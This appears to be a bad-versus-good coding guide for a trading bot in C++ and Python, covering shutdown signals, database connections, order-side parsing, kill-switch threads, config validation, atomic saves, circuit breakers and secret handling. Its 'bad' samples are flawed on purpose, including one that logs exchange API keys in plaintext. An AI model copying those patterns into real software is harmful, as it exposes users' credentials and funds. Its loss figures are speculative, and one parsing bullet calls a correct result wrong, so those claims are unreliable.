### ❌ Bad Code
```cpp
// main.cpp
int main(int argc, char* argv[]) {
    BotContext ctx{Config{}};
    init_config_and_logger(ctx, argc, argv);
    init_core_components(ctx);
    connect_all(ctx);

    while (is_running()) {
        process_signals(ctx);
        execute_orders(ctx);
        ctx.receiver->wait_for_data(ctx.config.signal_interval_ms);
    }

    graceful_shutdown(ctx);  // Never called on SIGTERM!
    return 0;
}

// is_running() checks:
static std::atomic<bool> running{true};
bool is_running() { return running.load(std::memory_order_relaxed); }
// running is never set to false by any signal handler
```

**What's wrong:**
- No signal handler for SIGTERM or SIGINT
- `is_running()` always returns true — the loop never exits
- In Kubernetes, pod termination sends SIGTERM → bot ignores it → K8s waits `terminationGracePeriodSeconds` (default 30s) → sends SIGKILL
- SIGKILL kills the process immediately — `graceful_shutdown()` never runs
- Open orders remain on the exchange — they can still fill
- Positions remain open — exposed to market risk with no monitoring
- SHM segments not cleaned up — memory leak in /dev/shm
- WebSocket connections not closed properly — server thinks bot is still connected
- No final PnL report, no audit log entry for shutdown

### ✅ Good Code
```cpp
#include <csignal>
#include <atomic>

static std::atomic<bool> running{true};

void signal_handler(int sig) {
    spdlog::info("Received signal {} — initiating graceful shutdown", sig);
    running.store(false, std::memory_order_release);
}

bool is_running() { return running.load(std::memory_order_relaxed); }

int main(int argc, char* argv[]) {
    // Register signal handlers BEFORE anything else
    std::signal(SIGTERM, signal_handler);
    std::signal(SIGINT, signal_handler);

    BotContext ctx{Config{}};
    if (!init_config_and_logger(ctx, argc, argv)) return 1;
    init_core_components(ctx);
    if (!connect_all(ctx)) return 1;

    while (is_running()) {
        ScopedLatency loop_timer(ctx.total_loop_hist);
        process_signals(ctx);
        execute_orders(ctx);
        // wait_for_data should have a timeout so the loop can check is_running()
        ctx.receiver->wait_for_data(ctx.config.signal_interval_ms);
    }

    graceful_shutdown(ctx);  // Now runs on SIGTERM/SIGINT
    spdlog::info("Bot stopped gracefully");
    return 0;
}
```

**Разница:** The bad code has no signal handler — SIGTERM is ignored, and the bot is force-killed with SIGKILL after the grace period. `graceful_shutdown()` never runs: open orders stay on the exchange, positions stay open, SHM segments leak, WebSocket connections dangle, and no audit log records the shutdown. In Kubernetes, this means every pod restart leaves the bot in an inconsistent state — the exchange still thinks the bot has open orders, the SHM segments accumulate in `/dev/shm`, and the next pod start may fail because the old SHM segments still exist. With 1000 users, each pod restart leaves $500,000+ in open orders unmanaged — they can fill at any price, including during a flash crash. The good code registers `signal(SIGTERM, ...)` and `signal(SIGINT, ...)` before the main loop. When K8s sends SIGTERM, the handler sets `running = false` with `memory_order_release` (ensures visibility to all threads). The loop exits on the next iteration (within `signal_interval_ms`), `graceful_shutdown()` runs, and the bot closes orders, closes positions, cleans SHM, closes WebSockets, and logs the shutdown. The cost is 3 lines of code. The benefit is clean shutdown on every pod restart — no leaked resources, no orphaned orders, no inconsistent state.

---

## Bad vs Good: DB Connection Per Operation (Python)

### ❌ Bad Code
```python
class Database:
    def __init__(self, path: str = "data/trading.db"):
        self.path = path
        self._init_db()

    def _conn(self) -> sqlite3.Connection:
        conn = sqlite3.connect(self.path)           # New connection!
        conn.execute("PRAGMA journal_mode=WAL")     # Disk write!
        conn.row_factory = sqlite3.Row
        return conn

    def save_signal(self, signal_dict: dict) -> int:
        with closing(self._conn()) as conn:         # Open + PRAGMA + close
            cursor = conn.execute(
                "INSERT INTO signals ...", (...)
            )
            conn.commit()
            return cursor.lastrowid

    def save_trade(self, trade_dict: dict) -> int:
        with closing(self._conn()) as conn:         # Open + PRAGMA + close AGAIN
            cursor = conn.execute(
                "INSERT INTO trades ...", (...)
            )
            conn.commit()
            return cursor.lastrowid

    def get_open_trades(self) -> list:
        with closing(self._conn()) as conn:         # Open + PRAGMA + close AGAIN
            return conn.execute("SELECT * FROM trades WHERE status='OPEN'").fetchall()
```

**What's wrong:**
- Every DB operation creates a new `sqlite3.connect()` — expensive (file open, lock acquisition)
- Every connection executes `PRAGMA journal_mode=WAL` — this is a disk write that changes the journal mode. It's idempotent but still does a disk I/O
- `closing()` closes the connection after each call — no connection reuse
- If the bot saves 100 signals per minute, that's 100 connections + 100 PRAGMA writes per minute
- SQLite WAL mode is persistent — setting it once is enough. Setting it on every connection is redundant I/O
- Connection creation is ~1-5ms per call — 100 calls = 100-500ms of pure overhead per minute

### ✅ Good Code
```python
class Database:
    def __init__(self, path: str = "data/trading.db"):
        self.path = path
        dir_path = os.path.dirname(path)
        if dir_path:
            os.makedirs(dir_path, exist_ok=True)
        self._conn = sqlite3.connect(path, check_same_thread=False)
        self._conn.execute("PRAGMA journal_mode=WAL")    # Set ONCE
        self._conn.execute("PRAGMA synchronous=NORMAL")   # Set ONCE
        self._conn.row_factory = sqlite3.Row
        self._lock = threading.Lock()  # For thread-safe access
        self._init_db()

    def save_signal(self, signal_dict: dict) -> int:
        with self._lock:
            cursor = self._conn.execute(
                "INSERT INTO signals ...", (...)
            )
            self._conn.commit()
            return cursor.lastrowid

    def save_trade(self, trade_dict: dict) -> int:
        with self._lock:
            cursor = self._conn.execute(
                "INSERT INTO trades ...", (...)
            )
            self._conn.commit()
            return cursor.lastrowid

    def close(self) -> None:
        try:
            self._conn.execute("PRAGMA wal_checkpoint(TRUNCATE)")
        except Exception as e:
            logging.warning(f"WAL checkpoint failed: {e}")
        finally:
            self._conn.close()
```

**Разница:** The bad code creates a new SQLite connection on every database operation. Each `save_signal()`, `save_trade()`, or `get_open_trades()` call opens a connection, executes `PRAGMA journal_mode=WAL` (a disk write), does the query, and closes the connection. With 100 signals per minute, that's 100 connection opens + 100 PRAGMA writes + 100 closes — 100-500ms of pure I/O overhead per minute. The PRAGMA is especially wasteful because WAL mode is persistent — once set, it stays set for the database file. Setting it again on every connection does a disk write for no reason. The good code creates a single persistent connection in `__init__`, sets WAL mode once, and reuses the connection for all operations. A `threading.Lock` protects concurrent access (SQLite connections are not thread-safe by default). The `close()` method does a proper WAL checkpoint and logs errors instead of swallowing them. With 1000 users, the bad code means 1000 bots × 100 operations/minute × 1-5ms overhead = 100-500 seconds of DB overhead per minute across all users. The good code reduces this to near-zero — the connection is already open, the PRAGMA is already set, and the only I/O is the actual query. The cost is one persistent connection + one lock. The benefit is 100x faster DB operations.

---

## Bad vs Good: Silent Default Side in Order Parsing (C++)

### ❌ Bad Code
```cpp
// types.h
inline Side string_to_side(const std::string& s) {
    return s == "BUY" ? Side::BUY : Side::SELL;
}

// signal.h
Side side() const {
    if (is_long()) return Side::BUY;
    if (is_short()) return Side::SELL;
    return Side::BUY; // NEUTRAL defaults to BUY
}

// Usage in bot_loop.cpp:
void process_ai_signals(BotContext& ctx, double balance, bool can_trade) {
    for (auto& sig : ctx.pending_signals) {
        // Forgot to check is_actionable()!
        Side side = sig.side();  // NEUTRAL → BUY
        double qty = calculate_position_size(ctx, sig, balance);
        ctx.executor->submit_order(sig.symbol, side, qty);
        // Submitted a BUY order for a NEUTRAL signal!
    }
}
```

**What's wrong:**
- `string_to_side("Sell")` → SELL (capital S, not "BUY" → SELL)
- `string_to_side("buy")` → SELL (lowercase → not "BUY" → SELL)
- `string_to_side("")` → SELL (empty → SELL)
- `string_to_side("BUY\n")` → SELL (trailing newline → SELL)
- `Signal::side()` for NEUTRAL returns BUY — if caller forgets `is_actionable()`, a neutral signal becomes a BUY order
- No error, no warning, no log — silent wrong-side order
- In HFT, a wrong-side order is catastrophic: the bot buys when it should do nothing, or sells when it should buy

### ✅ Good Code
```cpp
// types.h
#include <algorithm>
#include <optional>

inline std::optional<Side> string_to_side(std::string_view s) {
    // Case-insensitive comparison
    std::string lower(s);
    std::transform(lower.begin(), lower.end(), lower.begin(),
                   [](unsigned char c) { return std::tolower(c); });

    // Trim whitespace
    lower.erase(lower.find_last_not_of(" \t\r\n") + 1);
    lower.erase(0, lower.find_first_not_of(" \t\r\n"));

    if (lower == "buy" || lower == "long") return Side::BUY;
    if (lower == "sell" || lower == "short") return Side::SELL;
    return std::nullopt;  // Unknown — caller must handle
}

// signal.h
std::optional<Side> side() const {
    if (is_long()) return Side::BUY;
    if (is_short()) return Side::SELL;
    return std::nullopt;  // NEUTRAL — no side
}

// Usage in bot_loop.cpp:
void process_ai_signals(BotContext& ctx, double balance, bool can_trade) {
    for (auto& sig : ctx.pending_signals) {
        if (!sig.is_actionable()) continue;  // Skip NEUTRAL

        auto side = sig.side();
        if (!side) {
            spdlog::warn("Signal {} has no side (direction={})",
                         sig.symbol, sig.direction);
            continue;
        }

        double qty = calculate_position_size(ctx, sig, balance);
        ctx.executor->submit_order(sig.symbol, *side, qty);
    }
}
```

**Разница:** The bad code silently maps any unrecognized string to SELL and NEUTRAL to BUY. This means `"Sell"` (capital S) becomes SELL (wrong), `"buy"` (lowercase) becomes SELL (wrong), `""` (empty) becomes SELL (wrong), and NEUTRAL signals become BUY orders (wrong). There's no error, no warning, no log — the bot silently submits wrong-side orders. In HFT, a wrong-side order is catastrophic: if the bot receives a NEUTRAL signal (meaning "do nothing") but submits a BUY order, it opens a position with no signal backing. If BTC is about to drop 5%, the NEUTRAL signal says "don't trade", but the bot buys — and loses 5% immediately. With 1000 users, 100 wrong-side orders per day × $10,000 average position × 5% loss = $50,000 per day in preventable losses. The good code uses `std::optional<Side>` — if the string is unrecognized, it returns `std::nullopt`, forcing the caller to handle the error. The case-insensitive comparison handles "Buy", "BUY", "buy", "LONG", "long" correctly. The whitespace trimming handles "BUY\n" and "  sell  ". The caller checks `is_actionable()` first and logs a warning if `side()` returns nullopt. The cost is a few lines of code for case conversion and trimming. The benefit is zero wrong-side orders — every unrecognized input is caught and logged, not silently mapped to the wrong side.

---

## Bad vs Good: Kill Switch Thread Not Joined (C++)

### ❌ Bad Code
```cpp
class KillSwitch {
public:
    ~KillSwitch() { stop_monitoring(); }

    void start_monitoring() {
        running_.store(true);
        monitor_thread_ = std::thread(&KillSwitch::monitor_loop, this);
        monitor_thread_.detach();  // Detached — can't join!
    }

    void stop_monitoring() {
        running_.store(false);
        // Can't join — thread is detached!
        // Thread may still be running and accessing `this`
    }

private:
    void monitor_loop() {
        while (running_.load(std::memory_order_relaxed)) {
            if (std::filesystem::exists(trigger_file_)) {
                activate(Reason::FILE_TRIGGER);
                break;
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
        // After this returns, thread accesses `this->trigger_file_` etc.
        // But `this` may already be destroyed!
    }

    std::atomic<bool> running_{false};
    std::thread monitor_thread_;  // Detached, not joinable
    std::string trigger_file_;
};
```

**What's wrong:**
- `detach()` means the thread runs independently — `stop_monitoring()` can't wait for it
- `stop_monitoring()` sets `running_ = false`, but the thread may be in `sleep_for(100ms)` — it checks `running_` only after waking up
- If `KillSwitch` is destroyed immediately after `stop_monitoring()`, the thread wakes up and accesses `this->trigger_file_` — use-after-free
- The thread may call `activate()` which calls callbacks that reference destroyed objects
- In HFT, the kill switch is the last line of defense — if it crashes, the bot keeps trading with no emergency stop

### ✅ Good Code
```cpp
class KillSwitch {
public:
    ~KillSwitch() {
        stop_monitoring();
        if (monitor_thread_.joinable()) {
            monitor_thread_.join();  // Wait for thread to finish
        }
    }

    void start_monitoring() {
        running_.store(true, std::memory_order_release);
        monitor_thread_ = std::thread(&KillSwitch::monitor_loop, this);
        // No detach — we will join in destructor
    }

    void stop_monitoring() {
        running_.store(false, std::memory_order_release);
        // Thread will exit on next loop iteration
    }

private:
    void monitor_loop() {
        while (running_.load(std::memory_order_relaxed)) {
            if (std::filesystem::exists(trigger_file_)) {
                activate(Reason::FILE_TRIGGER);
                return;
            }
            // Use condition_variable for interruptible sleep
            std::unique_lock<std::mutex> lk(cv_mutex_);
            cv_.wait_for(lk, std::chrono::milliseconds(100),
                         [this] { return !running_.load(std::memory_order_relaxed); });
        }
    }

    std::atomic<bool> running_{false};
    std::thread monitor_thread_;
    std::mutex cv_mutex_;
    std::condition_variable cv_;
    std::string trigger_file_;
};
```

**Разница:** The bad code detaches the monitoring thread — `stop_monitoring()` sets `running_ = false` but can't wait for the thread to actually stop. If the `KillSwitch` is destroyed immediately after `stop_monitoring()`, the thread is still in `sleep_for(100ms)`. When it wakes up, it accesses `this->trigger_file_` — but `this` is already destroyed. This is a use-after-free: undefined behavior, possible crash, possible silent corruption. In the worst case, the thread calls `activate()` which invokes callbacks that reference destroyed `BotContext` members — the kill switch fires on a dead bot, calling `cancel_all_orders()` on a destroyed order executor. With 1000 users, this crash happens on every pod restart — the kill switch thread crashes, the bot has no emergency stop, and a flash crash wipes out $500,000+ in positions. The good code joins the thread in the destructor — `stop_monitoring()` sets `running_ = false`, then the destructor calls `monitor_thread_.join()` which blocks until the thread exits. The thread uses `condition_variable::wait_for()` instead of `sleep_for()` — it wakes up immediately when `running_` becomes false, instead of waiting up to 100ms. The total shutdown time is <1ms instead of up to 100ms. The cost is a `mutex` + `condition_variable` (64 bytes) and a `join()` call (blocks <1ms). The benefit is guaranteed safe shutdown — no use-after-free, no crashed kill switch, no bot without emergency stop.

---

## Bad vs Good: Config Validation Warnings Only, No Hard Fail (C++)

### ❌ Bad Code
```cpp
inline void validate_risk_params(const Config& cfg) {
    if (cfg.max_risk_per_trade_pct <= 0 || cfg.max_risk_per_trade_pct > 100)
        spdlog::warn("Config: max_risk_per_trade_pct={} out of range. "
                     "Recommended: 1.0-5.0.", cfg.max_risk_per_trade_pct);
    if (cfg.stop_loss_pct <= 0 || cfg.stop_loss_pct > 50)
        spdlog::warn("Config: stop_loss_pct={} out of range. "
                     "Recommended: 1.0-5.0.", cfg.stop_loss_pct);
    // ... more warnings ...
}

// Usage:
void init_config_and_logger(BotContext& ctx, int argc, char* argv[]) {
    ctx.config = Config::load(config_path);
    validate_risk_params(ctx.config);
    validate_trading_params(ctx.config);
    // No return value check — continues even if all params are invalid!
    return true;  // Always returns true
}
```

**What's wrong:**
- All validation failures are `spdlog::warn()` — the bot continues with invalid config
- `stop_loss_pct = 0` → no stop loss → unlimited downside risk
- `max_risk_per_trade_pct = -5` → negative risk → position sizing breaks
- `max_daily_drawdown_pct = 0` → no drawdown limit → bot can lose everything
- `max_open_positions = 0` → no positions allowed but bot still tries to trade
- In production with 1000 users, a misconfigured YAML can cause $1M+ in losses
- The warning is buried in log output — nobody reads warnings in a 500-line log file

### ✅ Good Code
```cpp
[[nodiscard]] inline bool validate_risk_params(const Config& cfg) {
    bool ok = true;

    if (cfg.max_risk_per_trade_pct <= 0 || cfg.max_risk_per_trade_pct > 100) {
        spdlog::error("Config: max_risk_per_trade_pct={} is INVALID (must be 0-100). "
                      "Recommended: 1.0-5.0. Bot will NOT start.", cfg.max_risk_per_trade_pct);
        ok = false;
    }

    // Critical: stop_loss = 0 means no stop loss → unlimited risk
    if (cfg.stop_loss_pct <= 0) {
        spdlog::error("Config: stop_loss_pct={} is INVALID (must be > 0). "
                      "No stop loss = unlimited downside. Bot will NOT start.",
                      cfg.stop_loss_pct);
        ok = false;
    } else if (cfg.stop_loss_pct > 50) {
        spdlog::warn("Config: stop_loss_pct={} is unusually high. "
                     "Recommended: 1.0-5.0. Continuing.", cfg.stop_loss_pct);
    }

    // Critical: max_daily_drawdown = 0 means no daily limit
    if (cfg.max_daily_drawdown_pct <= 0) {
        spdlog::error("Config: max_daily_drawdown_pct={} is INVALID (must be > 0). "
                      "No drawdown limit = can lose entire account. Bot will NOT start.",
                      cfg.max_daily_drawdown_pct);
        ok = false;
    }

    return ok;
}

// Usage:
bool init_config_and_logger(BotContext& ctx, int argc, char* argv[]) {
    ctx.config = Config::load(config_path);

    if (!validate_risk_params(ctx.config) ||
        !validate_trading_params(ctx.config)) {
        spdlog::error("Config validation FAILED. Fix config and restart.");
        return false;  // Abort startup!
    }

    Logger::init(ctx.config.log_level, "logs", ctx.config.is_production);
    return true;
}
```

**Разница:** The bad code logs warnings for all validation failures but always returns `true` — the bot starts with invalid config. `stop_loss_pct = 0` means no stop loss: if BTC drops 20%, the bot holds the position with no exit — unlimited downside. `max_daily_drawdown_pct = 0` means no daily loss limit: the bot can lose the entire account in one day. With 1000 users, one misconfigured YAML file (e.g., `stop_loss_pct: 0` instead of `stop_loss_pct: 2.0`) causes $10,000,000+ in losses across all users — the bot trades with no risk controls. The warning is buried in a 500-line log file that nobody reads. The good code distinguishes critical errors from warnings: `stop_loss_pct = 0` is an error (unlimited risk), `stop_loss_pct = 50` is a warning (unusually high but not dangerous). Critical errors return `false`, and `init_config_and_logger()` aborts startup — the bot doesn't start until the config is fixed. The cost is a `[[nodiscard]]` return value and a few `if` checks. The benefit is zero invalid-config startups — the bot refuses to start with dangerous config, preventing $10M+ in losses from a single YAML typo.

---

## Bad vs Good: Non-Atomic File Save (Python)

### ❌ Bad Code
```python
class ModelRegistry:
    def _save(self) -> None:
        """Save registry to disk."""
        with open(self.index_path, "w") as f:
            json.dump(data, f, indent=2)
        # If process crashes here → registry.json is corrupted
        # Half-written JSON, truncated, or empty file
        # Next _load() fails → all model versions lost

    def register(self, name: str, version: str, path: str, ...) -> ModelVersion:
        mv = ModelVersion(name=name, version=version, path=path, ...)
        self.models[name][version] = mv
        self._save()  # Crash here = corrupted registry
        return mv
```

**What's wrong:**
- `open(path, "w")` truncates the file immediately, then writes
- If the process crashes (OOM, SIGKILL, power loss) during `json.dump()`, the file is truncated/corrupted
- Next `_load()` fails with `json.JSONDecodeError` → all model versions, A/B tests, and production assignments lost
- The registry starts empty → no production model → bot falls back to rule-based or stops
- With 1000 users, a crash during model promotion = all users lose their ML model → 20% performance degradation until manual recovery
- Recovery requires re-registering all models, re-promoting production, re-creating A/B tests — hours of manual work

### ✅ Good Code
```python
import os
import tempfile

class ModelRegistry:
    def _save(self) -> None:
        """Atomically save registry to disk."""
        os.makedirs(self.storage_dir, exist_ok=True)
        data = {
            "models": {name: {ver: {**asdict(v), "status": v.status.value}
                              for ver, v in versions.items()}
                       for name, versions in self.models.items()},
            "ab_tests": {name: asdict(ab) for name, ab in self.ab_tests.items()},
        }

        # Write to temp file in same directory (same filesystem for atomic rename)
        fd, tmp_path = tempfile.mkstemp(
            dir=self.storage_dir, suffix=".tmp", prefix="registry_"
        )
        try:
            with os.fdopen(fd, "w") as f:
                json.dump(data, f, indent=2)
                f.flush()
                os.fsync(f.fileno())  # Force write to disk
            # Atomic rename — old file is intact until rename completes
            os.replace(tmp_path, self.index_path)  # os.replace is atomic on POSIX and Windows
        except Exception:
            # Clean up temp file on error — old registry.json is untouched
            if os.path.exists(tmp_path):
                os.unlink(tmp_path)
            raise
```

**Разница:** The bad code writes directly to `registry.json` — `open("w")` truncates the file before writing. If the process crashes during `json.dump()`, the file is half-written: truncated JSON, missing closing braces, or empty. Next `_load()` raises `json.JSONDecodeError` — the registry starts empty, all model versions and A/B tests are lost. With 1000 users, a crash during model promotion means all users lose their ML model: the bot falls back to rule-based heuristics, generating 20% fewer profitable signals. Recovery requires hours of manual work: re-registering all models from checkpoints, re-promoting production, re-creating A/B tests. The good code writes to a temp file first, then atomically renames it to `registry.json` using `os.replace()` (atomic on both POSIX and Windows). If the process crashes during write, the temp file is corrupted but `registry.json` is untouched — the old registry is intact. `f.flush()` + `os.fsync()` ensures the data is written to disk before rename, protecting against power loss. The `except` block cleans up the temp file on error. The cost is a few extra lines (tempfile, fsync, replace) and ~1ms overhead per save. The benefit is zero data loss on crash — the registry is always either the old version or the new version, never corrupted.

---

## Bad vs Good: Side Effect in Property (Python)

### ❌ Bad Code
```python
class CircuitBreaker:
    """Circuit breaker for external API calls."""

    def __init__(self, failure_threshold: int = 5, recovery_timeout: float = 30.0):
        self.failure_threshold = failure_threshold
        self.recovery_timeout = recovery_timeout
        self._failure_count = 0
        self._last_failure_time: float = 0
        self._state = "closed"  # closed, open, half_open

    @property
    def is_open(self) -> bool:
        """Check if circuit is open."""
        if self._state == "open":
            if time.time() - self._last_failure_time > self.recovery_timeout:
                self._state = "half_open"  # MUTATION IN PROPERTY!
                return False
            return True
        return False

    def record_success(self) -> None:
        self._failure_count = 0
        self._state = "closed"

    def record_failure(self) -> None:
        self._failure_count += 1
        self._last_failure_time = time.time()
        if self._failure_count >= self.failure_threshold:
            self._state = "open"

# Usage:
cb = CircuitBreaker(failure_threshold=5, recovery_timeout=30.0)

# In the hot path:
if cb.is_open:  # ← This MUTATES _state! open → half_open
    logger.warning("Circuit open, skipping API call")
    return None

# Later, another check:
if cb.is_open:  # Now returns False (half_open), allows traffic
    logger.warning("Circuit still open")
    return None

# The first is_open check changed state from "open" to "half_open"
# The second check sees "half_open", returns False
# Traffic flows to a potentially broken API without any success() call
```

**What's wrong:**
- `is_open` is a **property** — reading it should be a pure query with no side effects
- But it **mutates** `_state` from `"open"` to `"half_open"` — a state transition hidden in a read
- This violates the **principle of least surprise**: `if cb.is_open:` looks like a read, but it changes state
- Multiple reads of `is_open` produce different results: first returns `True`, second returns `False`
- No lock — concurrent reads of `is_open` from multiple async tasks race on `_state`
- The `half_open` state is entered **without any validation** — traffic flows immediately
- With 1000 users, a broken exchange API gets traffic 30s after the circuit opens, without any health check. If the API is still broken, 1000 users get failed requests, and the circuit re-opens only after 5 more failures

### ✅ Good Code
```python
class CircuitBreaker:
    """Circuit breaker for external API calls — thread-safe, no side effects in properties."""

    def __init__(self, failure_threshold: int = 5, recovery_timeout: float = 30.0):
        self.failure_threshold = failure_threshold
        self.recovery_timeout = recovery_timeout
        self._failure_count = 0
        self._last_failure_time: float = 0
        self._state = "closed"  # closed, open, half_open
        self._lock = asyncio.Lock()

    @property
    def is_open(self) -> bool:
        """Check if circuit is open. READ-ONLY — no side effects."""
        return self._state == "open"  # Pure query, no mutation

    @property
    def state(self) -> str:
        """Current circuit state."""
        return self._state

    async def try_reset(self) -> bool:
        """Attempt to transition from open to half_open. Returns True if reset."""
        async with self._lock:
            if self._state != "open":
                return False
            if time.time() - self._last_failure_time <= self.recovery_timeout:
                return False
            self._state = "half_open"
            logger.info("[CircuitBreaker] Transitioning open → half_open")
            return True

    async def record_success(self) -> None:
        async with self._lock:
            self._failure_count = 0
            if self._state == "half_open":
                self._state = "closed"
                logger.info("[CircuitBreaker] half_open → closed (recovered)")
            elif self._state == "open":
                self._state = "closed"
                logger.info("[CircuitBreaker] open → closed (recovered)")

    async def record_failure(self) -> None:
        async with self._lock:
            self._failure_count += 1
            self._last_failure_time = time.time()
            if self._failure_count >= self.failure_threshold:
                if self._state != "open":
                    self._state = "open"
                    logger.warning(
                        f"[CircuitBreaker] → open after {self._failure_count} failures"
                    )

# Usage:
cb = CircuitBreaker(failure_threshold=5, recovery_timeout=30.0)

# In the hot path:
if cb.is_open:  # Pure read — no side effects
    # Try to reset after recovery timeout
    if await cb.try_reset():
        logger.info("Circuit reset to half_open, testing with one request")
    else:
        logger.warning("Circuit open, skipping API call")
        return None

# try_reset() is an explicit state transition — no hidden mutation
# is_open is always safe to call multiple times — same result
# All state changes are protected by asyncio.Lock — no races
```

**Разница:** The bad code has a hidden state transition in `is_open` — reading the property changes `_state` from `"open"` to `"half_open"`. This violates the principle of least surprise: `if cb.is_open:` looks like a read, but it's a write. Multiple reads produce different results: first `True`, second `False`. No lock means concurrent reads from multiple async tasks race on `_state`. With 1000 users, a broken exchange API gets traffic 30s after the circuit opens, without any health check — if the API is still broken, 1000 users get failed requests. The good code separates the read (`is_open` — pure query, no mutation) from the write (`try_reset()` — explicit state transition with lock). `is_open` always returns the same value for the same state — safe to call multiple times. All state changes are protected by `asyncio.Lock` — no races. `try_reset()` is an explicit method call — the developer knows they're changing state. The cost is one extra method (`try_reset`) and a lock. The benefit is predictable behavior: properties are reads, methods are writes, no hidden mutations, no races.

---

## Bad vs Good: Silent Default Side in Trading (C++)

### ❌ Bad Code
```cpp
enum class Side { BUY, SELL };

inline Side string_to_side(const std::string& s) {
    return s == "BUY" ? Side::BUY : Side::SELL;
}

// Usage:
Side side = string_to_side(order_json["side"]);  // What if "side" is missing?
// JSON: {"side": "buy"}  → SELL (lowercase, not "BUY")
// JSON: {"side": "Buy"}  → SELL (case-sensitive)
// JSON: {"side": "BYU"}  → SELL (typo)
// JSON: {"side": ""}     → SELL (empty string)
// JSON: {}               → SELL (missing field → empty string from json lib)
```

**What's wrong:**
- Any string that isn't exactly `"BUY"` defaults to `SELL` — silently, with no error
- Case-sensitive: `"buy"`, `"Buy"`, `"bUy"` all become `SELL`
- Typos: `"BYU"` becomes `SELL`
- Missing fields: if the JSON doesn't have `"side"`, the JSON library returns `""`, which becomes `SELL`
- In a trading system, a silent wrong side means the bot **buys when it should sell** or vice versa
- With 1000 users, one malformed JSON from the exchange (missing `"side"` field) causes the bot to sell 1000 BTC positions instead of buying — a $50M+ mistake
- No log, no error, no exception — the bot silently does the wrong thing

### ✅ Good Code
```cpp
#include <algorithm>
#include <cctype>
#include <stdexcept>
#include <string_view>

enum class Side { BUY, SELL };

inline std::string side_to_string(Side s) {
    return s == Side::BUY ? "BUY" : "SELL";
}

inline Side string_to_side(std::string_view s) {
    // Case-insensitive comparison
    auto to_upper = [](char c) { return static_cast<char>(std::toupper(static_cast<unsigned char>(c))); };

    std::string upper;
    upper.reserve(s.size());
    for (char c : s) upper.push_back(to_upper(c));

    if (upper == "BUY")  return Side::BUY;
    if (upper == "SELL") return Side::SELL;

    // Explicit error — no silent default
    throw std::invalid_argument(
        "Unknown side: '" + std::string(s) + "' (expected BUY or SELL)"
    );
}

// Usage with error handling:
try {
    Side side = string_to_side(order_json.value("side", ""));
    // If "side" is missing, value() returns "" → throws
    // If "side" is "buy", case-insensitive → BUY
    // If "side" is "BYU", throws with clear error
} catch (const std::invalid_argument& e) {
    logger.error("Invalid order side: {} — rejecting order", e.what());
    // Reject the order, don't trade with wrong side
    return;
}
```

**Разница:** The bad code silently defaults any unrecognized string to `SELL`. In a trading system with 1000 users, one malformed JSON (missing `"side"` field, lowercase `"buy"`, or a typo `"BYU"`) causes the bot to sell when it should buy — a $50M+ mistake. The error is silent: no log, no exception, no indication that anything went wrong. The bot happily executes the wrong trade. The good code uses case-insensitive comparison (`"buy"`, `"Buy"`, `"BUY"` all work) and throws `std::invalid_argument` for any unrecognized string. The caller catches the exception, logs the error, and rejects the order — no wrong trade is executed. The cost is a few extra lines (case conversion, throw, try/catch). The benefit is zero silent wrong-side trades — the bot either trades the correct side or rejects the order with a clear error message.

---

## Bad vs Good: API Keys in Plaintext Config (C++)

### ❌ Bad Code
```cpp
struct Config {
    // Exchange credentials stored as plaintext std::string
    std::string api_key;
    std::string api_secret;
    std::string passphrase;  // OKX only
    // ... 80+ other fields ...
};

// Loaded from YAML:
Config config;
config.api_key = yaml["api_key"].as<std::string>();      // "abc123secret"
config.api_secret = yaml["api_secret"].as<std::string>(); // "def456secret"

// Problem 1: Logging
spdlog::info("Config loaded: api_key={}", config.api_key);
// → "Config loaded: api_key=abc123secret" — KEY IN LOGS

// Problem 2: Crash dump
// Core dump contains the Config struct with plaintext keys
// Anyone with core dump access has exchange API credentials

// Problem 3: Memory not zeroed
// When Config is destroyed, std::string destructor frees memory
// but doesn't zero it. Keys remain in heap memory until overwritten.
// A heap inspection tool can extract them.

// Problem 4: Copy semantics
Config config2 = config;  // Deep copy of api_key and api_secret
// Now 2 copies of secrets in memory. config2 goes out of scope,
// frees memory but doesn't zero. 2 copies of secrets in freed heap.
```

**What's wrong:**
- API keys stored as `std::string` — plaintext, no encryption, no redaction
- `spdlog::info("api_key={}", config.api_key)` logs the key to file — anyone with log access has exchange credentials
- Core dumps contain the full `Config` struct with plaintext keys — anyone with core dump access can trade on your exchange account
- `std::string` destructor doesn't zero memory — keys remain in freed heap until overwritten
- Copy semantics create multiple copies of secrets in memory — each copy is a leak vector
- With 1000 users, one core dump or log file leak exposes exchange API credentials for ALL users — an attacker can withdraw all funds, place malicious orders, or manipulate prices
- Exchange API keys typically have withdrawal permissions — this is a $10M+ security risk

### ✅ Good Code
```cpp
#include <openssl/crypto.h>  // OPENSSL_cleanse
#include <spdlog/spdlog.h>
#include <string>

class SecureString {
public:
    SecureString() = default;
    explicit SecureString(std::string s) : data_(std::move(s)) {}

    ~SecureString() { cleanse(); }

    SecureString(const SecureString&) = delete;            // No copies
    SecureString& operator=(const SecureString&) = delete; // No copies

    SecureString(SecureString&& other) noexcept : data_(std::move(other.data_)) {
        other.data_.clear();
    }

    SecureString& operator=(SecureString&& other) noexcept {
        if (this != &other) {
            cleanse();
            data_ = std::move(other.data_);
            other.data_.clear();
        }
        return *this;
    }

    const std::string& get() const { return data_; }  // Access only when needed
    bool empty() const { return data_.empty(); }

    // Redact in logs — never expose the actual value
    friend std::ostream& operator<<(std::ostream& os, const SecureString&) {
        return os << "[REDACTED]";
    }

private:
    void cleanse() {
        if (!data_.empty()) {
            OPENSSL_cleanse(data_.data(), data_.size());  // Zero memory
            data_.clear();
        }
    }

    std::string data_;
};

struct Config {
    SecureString api_key;
    SecureString api_secret;
    SecureString passphrase;
    // ... other fields ...

    // Validate without exposing secrets
    bool has_credentials() const {
        return !api_key.empty() && !api_secret.empty();
    }
};

// Usage:
Config config;
config.api_key = SecureString(yaml["api_key"].as<std::string>());

// Safe logging — redacts automatically:
spdlog::info("Config loaded: api_key={}", config.api_key);
// → "Config loaded: api_key=[REDACTED]"

// No copies — move-only semantics:
// Config config2 = config;  // COMPILE ERROR — deleted copy constructor

// Memory zeroed on destruction — no keys in freed heap
```

